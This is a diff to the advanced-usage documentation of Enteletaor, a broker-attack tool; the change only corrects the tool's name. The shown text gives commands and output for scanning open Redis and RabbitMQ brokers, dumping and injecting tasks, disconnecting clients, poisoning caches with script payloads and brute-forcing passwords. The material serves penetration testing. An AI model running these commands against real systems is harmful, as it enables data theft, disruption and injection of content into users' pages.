@@ -1,7 +1,7 @@
 Advanced usage
 ==============
 
-Enteleteaor implements some attacks and has many options to interact with different brokers:
+Enteletaor implements some attacks and has many options to interact with different brokers:
 
     - Redis
     - RabbitMQ (of AMQP compabible)
@@ -18,7 +18,7 @@ There are the 3 kind actions implemented:
 Scanner
 -------
 
-Enteleteaor implements a scanner that detects open brokers. The scanner is implemented in pure python, with no external dependecies, like ``nmap``.
+Enteletaor implements a scanner that detects open brokers. The scanner is implemented in pure python, with no external dependecies, like ``nmap``.
 
 The reason to implement a native scanner is because in ``nmap`` v7 no all scripts that detects open services works.
 
@@ -31,16 +31,16 @@ Custom ports
 
 As you can read in :doc:`quickstart` document, you can scan a single host or a network. Syntax is nmap-like.
 
-You can specify other ports that enteleteaor default, using ``-p`` option:
+You can specify other ports that enteletaor default, using ``-p`` option:
 
 .. code-block:: bash
 
-    # enteleteaor scan -t 10.10.0.10/16 -p 5550,5551
+    # enteletaor scan -t 10.10.0.10/16 -p 5550,5551
 
 Parallel scanning
 +++++++++++++++++
 
-By default, enteleteaor runs 20 concurrent scanning. Internally it's implemented with *greenlets* threads. It means that are not "real" Python threads. You can think about greenlets thread as a lightweight version of threads.
+By default, enteletaor runs 20 concurrent scanning. Internally it's implemented with *greenlets* threads. It means that are not "real" Python threads. You can think about greenlets thread as a lightweight version of threads.
 
 I recommend to use 40 concurrent scanning threads. Don't worry for the overload of your system, green threads will made this possible without a hungry CPU process.
 
@@ -48,31 +48,31 @@ To change concurrency, we use ``-c`` option:
 
 .. code-block:: bash
 
-    # enteleteaor scan -t 10.10.0.10/24 -c 40
+    # enteletaor scan -t 10.10.0.10/24 -c 40
 
 Saving results
 ++++++++++++++
 
-Enteleteaor can export scan results as a JSON format, using ``--output`` option:
+Enteletaor can export scan results as a JSON format, using ``--output`` option:
 
 .. code-block:: bash
 
-    # enteleteaor scan -t 10.10.0.10 --output results
+    # enteletaor scan -t 10.10.0.10 --output results
 
 Or:
 
 .. code-block:: bash
 
-    # enteleteaor scan -t 10.10.0.10 --output results.json
+    # enteletaor scan -t 10.10.0.10 --output results.json
 
 .. note::
 
-    If you don't indicate the file extension, enteleteaor will add it for you.
+    If you don't indicate the file extension, enteletaor will add it for you.
 
 Company lookup
 ++++++++++++++
 
-This is a bit strange option. Typing ``-o`` enteleteaor will try to lookup the company name in RIPE and get all IP ranges registered for it, adding then to scanner.
+This is a bit strange option. Typing ``-o`` enteletaor will try to lookup the company name in RIPE and get all IP ranges registered for it, adding then to scanner.
 
 For example, if you try to get scan ``google.com`` it will 1465 new host:
 
@@ -130,11 +130,11 @@ Listing remote tasks
 Basic usage
 ___________
 
-If there are pending tasks in broker queue, we can analyze them. Enteleteaor allow us to list all tasks found. Although there is more than one task of each type in queue, only the task definition is displayed:
+If there are pending tasks in broker queue, we can analyze them. Enteletaor allow us to list all tasks found. Although there is more than one task of each type in queue, only the task definition is displayed:
 
 .. code-block:: bash
 
-    # enteleteaor -v tasks list-tasks -t 10.10.0.10
+    # enteletaor -v tasks list-tasks -t 10.10.0.10
     [ * ] Starting Enteletaor execution
     [ * ]   - Trying to connect with server...
     [ * ]   - Remote process found:
@@ -150,7 +150,7 @@ We can see that broker has 2 task definition stored:
 Export Template
 _______________
 
-Enteleteaor also permit inject new tasks to broker (see bellow). The way to inject them is to pass as input a JSON file with the information. Write this file must be a bit hard. To help us, enteleteaor can export a template.
+Enteletaor also permit inject new tasks to broker (see bellow). The way to inject them is to pass as input a JSON file with the information. Write this file must be a bit hard. To help us, enteletaor can export a template.
 
 With this template, we only must fill the appropriate fields:
 
@@ -158,7 +158,7 @@ With this template, we only must fill the appropriate fields:
     :linenos:
     :emphasize-lines: 8
 
-    # enteleteaor -v tasks list-task -t 10.10.0.10 -T my_template -F tasks.send_mail
+    # enteletaor -v tasks list-task -t 10.10.0.10 -T my_template -F tasks.send_mail
     [ * ] Starting Enteletaor execution
     [ * ]   - Trying to connect with server...
     [ * ]   - Remote process found:
@@ -180,7 +180,7 @@ We also can remove **all** pending task from the broker queue. It's so simple:
 
 .. code-block:: bash
 
-    # enteleteaor tasks remove -t 10.10.0.10
+    # enteletaor tasks remove -t 10.10.0.10
     [ * ] Starting Enteletaor execution
     [ * ]   - Trying to connect with server...
     [ * ]    - All tasks removed from '10.10.0.10'
@@ -196,7 +196,7 @@ We can dump the content of tasks simply using ``raw-dump` sub-command:
 
 .. code-block:: bash
 
-    # enteleteaor tasks raw-dump -t 10.10.0.10
+    # enteletaor tasks raw-dump -t 10.10.0.10
     [ * ] Starting Enteletaor execution
     [ * ]   - Trying to connect with server...
     [ * ]   Found process information:
@@ -228,13 +228,13 @@ We can dump the content of tasks simply using ``raw-dump` sub-command:
 Streaming mode
 ______________
 
-Some times we could want listen new messages available in broker in real time . If we use ``--streaming`` option, enteleteaor will wait for new messages:
+Some times we could want listen new messages available in broker in real time . If we use ``--streaming`` option, enteletaor will wait for new messages:
 
 .. code-block:: bash
     :linenos:
     :emphasize-lines: 17-20
 
-    # enteleteaor tasks raw-dump -t 10.10.0.10 --streaming
+    # enteletaor tasks raw-dump -t 10.10.0.10 --streaming
     [ * ] Starting Enteletaor execution
     [ * ]   - Trying to connect with server...
     [ * ]   Found process information:
@@ -260,13 +260,13 @@ ___________
 
 We can export results to CSV file using ``--output`` option. The reason to choose this format is because it permit real-time reading. In other words:
 
-Imagine you want to put enteleteaor in streaming mode and, at the same time, put another process to read the information from export file, CSV allow this because each line is independent of others.
+Imagine you want to put enteletaor in streaming mode and, at the same time, put another process to read the information from export file, CSV allow this because each line is independent of others.
 
-Enteleteaor writes in CSV as *append* mode, so it will not overwriting old file content:
+Enteletaor writes in CSV as *append* mode, so it will not overwriting old file content:
 
 .. code-block:: bash
         
-    # enteleteaor tasks raw-dump -t 10.10.0.10 --streaming --output dumped_server_file
+    # enteletaor tasks raw-dump -t 10.10.0.10 --streaming --output dumped_server_file
 
 And, in other console, we can write:
 
@@ -276,12 +276,12 @@ And, in other console, we can write:
 
 .. note::
 
-    If not extension provided, enteleteaor automatically add .csv
+    If not extension provided, enteletaor automatically add .csv
 
 Inject new tasks
 ++++++++++++++++
 
-Finally, enteleteaor permit us to inject new tasks to the broker flow. The injection only accept one parameter: ``-f`` (``--function-file``).
+Finally, enteletaor permit us to inject new tasks to the broker flow. The injection only accept one parameter: ``-f`` (``--function-file``).
 
 This parameter need a JSON as input file with the function parameters. Do you remember `Export template`_ option of the list-tasks sub-command?
 
@@ -289,7 +289,7 @@ One we have the JSON file, we can inject the new process:
 
 .. code-block:: bash
 
-    # enteleteaor tasks inject -f my_template.json
+    # enteletaor tasks inject -f my_template.json
     [ * ] Starting Enteletaor execution
     [ * ]   - Building process...
     [ * ]   - Trying to connect with server...
@@ -334,7 +334,7 @@ This command need as input the client to disconnect. Client must be as format: I
     :linenos:
     :emphasize-lines: 7,13
 
-    # enteleteaor redis connected -t 10.10.0.10
+    # enteletaor redis connected -t 10.10.0.10
     [ * ] Starting Enteletaor execution
     [ * ] Connected users to '10.10.0.10':
     [ * ]   - 10.10.0.2:52748 (DB: 0)
@@ -344,7 +344,7 @@ This command need as input the client to disconnect. Client must be as format: I
     [ * ]   - 10.10.0.2:51200 (DB: 0)
     [ * ] Done!
 
-    # enteleteaor redis disconnect -t 10.10.0.10 -c 127.0.0.1:42262
+    # enteletaor redis disconnect -t 10.10.0.10 -c 127.0.0.1:42262
     [ * ] Starting Enteletaor execution
     [ * ]   - Client '127.0.0.1:42264' was disconnected
     [ * ] Done!
@@ -352,11 +352,11 @@ This command need as input the client to disconnect. Client must be as format: I
 Disconnect all users
 ____________________
 
-If you want to disconnect all connected users, enteleteaor has the shortcut ``--all``:
+If you want to disconnect all connected users, enteletaor has the shortcut ``--all``:
 
 .. code-block:: bash
 
-    # enteleteaor redis disconnect -t 10.10.0.10 --all
+    # enteletaor redis disconnect -t 10.10.0.10 --all
 
 Discovering DBs
 +++++++++++++++
@@ -365,7 +365,7 @@ By default Redis has 16 databases, but you can add as many as you need. If the d
 
 .. code-block:: bash
 
-    # enteleteaor redis discover-dbs -t 10.10.0.10
+    # enteletaor redis discover-dbs -t 10.10.0.10
     [ * ] Starting Enteletaor execution
     [ * ] Discovered '10.10.0.10' DBs at '16':
     [ * ]    - DB0 - 4 keys
@@ -397,7 +397,7 @@ One of more interesting thing is display information stored in redis and has the
 
 .. code-block:: bash
 
-    # enteleteaor redis dump -t 10.10.0.10
+    # enteletaor redis dump -t 10.10.0.10
     [ * ] Starting Enteletaor execution
     [ * ]   - Trying to connect with redis server...
     [ * ]     "b'unacked'":
@@ -455,7 +455,7 @@ Don't worry if above console output is a bit heavy, we can export results to a J
 
 .. code-block:: bash
 
-    # enteleteaor redis dump -t 10.10.0.10 -e dumped_info
+    # enteletaor redis dump -t 10.10.0.10 -e dumped_info
     [ * ] Starting Enteletaor execution
     [ * ]   - Trying to connect with redis server...
     [ * ]   - Storing information into 'results.json'
@@ -509,7 +509,7 @@ Don't worry if above console output is a bit heavy, we can export results to a J
 
 .. note::
 
-    We don't need to put the extension .json to file. If extension is missing, enteleteaor will add it.
+    We don't need to put the extension .json to file. If extension is missing, enteletaor will add it.
 
 Hide screen output
 __________________
@@ -518,7 +518,7 @@ If you don't want to display information into screen (useful when Redis contains
 
 .. code-block:: bash
 
-    # enteleteaor redis dump -t 10.10.0.10 -e dumped_info --no-screen
+    # enteletaor redis dump -t 10.10.0.10 -e dumped_info --no-screen
     [ * ] Starting Enteletaor execution
     [ * ]   - Trying to connect with redis server...
     [ * ]   - Storing information into 'results.json'
@@ -532,11 +532,11 @@ Redis is commonly used as a centralized cache system. We can handle this cache s
 Finding cache keys
 __________________
 
-First step is find possible cache keys in Redis. Enteleteaor has the option ``--search`` that will try to find this keys:
+First step is find possible cache keys in Redis. Enteletaor has the option ``--search`` that will try to find this keys:
 
 .. code-block:: bash
 
-    # enteleteaor redis cache -t 10.10.0.10
+    # enteletaor redis cache -t 10.10.0.10
     [ * ] Starting Enteletaor execution
     [ * ] Looking for caches in '10.10.0.10'...
     [ * ]   - Possible cache found in key: 'flask_cache_view//'
@@ -549,7 +549,7 @@ If we want to dump, as raw-way, possible cache keys (not only locate) we omit th
 
 .. code-block:: bash
 
-    # enteleteaor redis cache -t 10.10.0.10
+    # enteletaor redis cache -t 10.10.0.10
     [ * ] Starting Enteletaor execution
     [ * ]   - Listing cache information:
     [ * ]     -> Key: 'flask_cache_view//'
@@ -579,7 +579,7 @@ We can dump only an specific key:
 
 .. code-block:: bash
 
-    # enteleteaor redis cache -t 10.10.0.10 --cache-key "flask_cache_view//"
+    # enteletaor redis cache -t 10.10.0.10 --cache-key "flask_cache_view//"
     [ * ] Starting Enteletaor execution
     [ * ]   - Listing cache information:
     [ * ]     -> Key: 'flask_cache_view//'
@@ -605,13 +605,13 @@ We can dump only an specific key:
 Basic cache poisoning
 _____________________
 
-Enteleteaor permit us to poison the cache. To enable the cache poisoning we need to enable it with option ``-P``.
+Enteletaor permit us to poison the cache. To enable the cache poisoning we need to enable it with option ``-P``.
 
-By default, enteleteaor will try to inject an HTML <script> tag with an alert message: "You are vulnerable to broker injection".
+By default, enteletaor will try to inject an HTML <script> tag with an alert message: "You are vulnerable to broker injection".
 
 .. code-block:: bash
         
-    # enteleteaor redis cache -P -t 10.10.0.1
+    # enteletaor redis cache -P -t 10.10.0.1
     [ * ] Starting Enteletaor execution
     [ * ]   - Trying to connect with redis server...
     [ * ]   - Poisoning enabled
@@ -629,7 +629,7 @@ Using ``--payload`` option. This option need a file with the script:
 
 .. code-block:: bash
 
-    # enteleteaor redis cache -P -t 10.10.0.10 --payload "<script>document.write('Say cheeeeers')</script>"
+    # enteletaor redis cache -P -t 10.10.0.10 --payload "<script>document.write('Say cheeeeers')</script>"
     [ * ] Starting Enteletaor execution
     [ * ]   - Poisoning enabled
     [ * ]   - Poisoned cache key 'b'flask_cache_view//'' at server '10.10.0.10'
@@ -640,7 +640,7 @@ Using ``--payload`` option. This option need a file with the script:
 .. code-block:: bash
 
     # echo "<script>document.write('Say cheeeeers')</script>" > my_payload.txt
-    # enteleteaor redis cache -P -t 10.10.0.10 --file-payload my_payload.txt
+    # enteletaor redis cache -P -t 10.10.0.10 --file-payload my_payload.txt
     [ * ] Starting Enteletaor execution
     [ * ]   - Poisoning enabled
     [ * ]   - Poisoned cache key 'b'flask_cache_view//'' at server '10.10.0.10'
@@ -654,7 +654,7 @@ Finally, we can replace entire content of cache key using option ``--replace-htm
 .. code-block:: bash
 
     # echo "<html><head><title>Replaced content</title></head><body><h1>Say cheeeeers again :)</h1></body></html>" > new_html.html
-    # enteleteaor redis cache -P -t 10.10.0.10 --replace-html new_html.html
+    # enteletaor redis cache -P -t 10.10.0.10 --replace-html new_html.html
     [ * ] Starting Enteletaor execution
     [ * ]   - Poisoning enabled
     [ * ]   - Poisoned cache key 'flask_cache_view//' at server '10.10.0.10'
@@ -667,11 +667,11 @@ Password brute forcer
 Listing wordlist
 ++++++++++++++++
 
-Enteleteaor has some wordlist embedded. If you want to show them, you must write:
+Enteletaor has some wordlist embedded. If you want to show them, you must write:
 
 .. code-block:: bash
 
-    # enteleteaor brute wordlist
+    # enteletaor brute wordlist
     [ * ] Starting Enteletaor execution
     [ * ]   - Available wordlists:
     [ * ]     > 10_million_password_list_top_100
@@ -685,16 +685,16 @@ The wordlist names could be used as input for the password module.
 Discovering passwords
 +++++++++++++++++++++
 
-We can try to discover remote passwords using enteleteaor. To do this, we need a wordlist with passwords that we want to test. If we don't have any wordlist we can use one of embedded.
+We can try to discover remote passwords using enteletaor. To do this, we need a wordlist with passwords that we want to test. If we don't have any wordlist we can use one of embedded.
 
 Basic usage
 ___________
 
-Using default options, enteleteaor se the wordlist ``10_million_password_list_top_1000``.
+Using default options, enteletaor se the wordlist ``10_million_password_list_top_1000``.
 
 .. code-block:: bash
 
-    # enteleteaor brute password -t 10.10.0.10
+    # enteletaor brute password -t 10.10.0.10
     [ * ] Starting Enteletaor execution
     [ * ]   - Detected 'Redis' server with 'auth'.
     [ * ]   - Starting bruteforcer using wordlist : '/Users/Dani/Documents/Projects/enteletaor/enteletaor_lib/resources/wordlist/10_million_password_list_top_1000.txt'
@@ -711,13 +711,13 @@ We can set an external wordlist, with the option ``-w``.
 
 .. code-block:: bash
         
-    # enteleteaor brute password -t 10.10.0.10 -w /home/user/my_wordlist.txt
+    # enteletaor brute password -t 10.10.0.10 -w /home/user/my_wordlist.txt
 
 Or use a different embedded:
 
 .. code-block:: bash
 
-    # enteleteaor brute password -t 10.10.0.10 -w 10_million_password_list_top_100000
+    # enteletaor brute password -t 10.10.0.10 -w 10_million_password_list_top_100000
 
 Setting concurrency
 ___________________
@@ -726,16 +726,16 @@ We also can specify the number os concurrent test we want to do, using option ``
 
 .. code-block:: bash
 
-    # enteleteaor brute password -t 10.10.0.10 -w 10_million_password_list_top_100000 -c 20
+    # enteletaor brute password -t 10.10.0.10 -w 10_million_password_list_top_100000 -c 20
 
 Setting remote user
 ___________________
 
-Currently enteleteaor doesn't support brute forcer for users, so for servers that need user/password we must set the **user**, using option ``-u``:
+Currently enteletaor doesn't support brute forcer for users, so for servers that need user/password we must set the **user**, using option ``-u``:
 
 .. code-block:: bash
 
-    # enteleteaor brute password -t 10.10.0.10 -p 5672 -u admin
+    # enteletaor brute password -t 10.10.0.10 -p 5672 -u admin
     [ * ] Starting Enteletaor execution
     [ * ]   - Detected 'RabbitMQ' server with 'auth'.
     [ * ]   - Set user to 'admin'
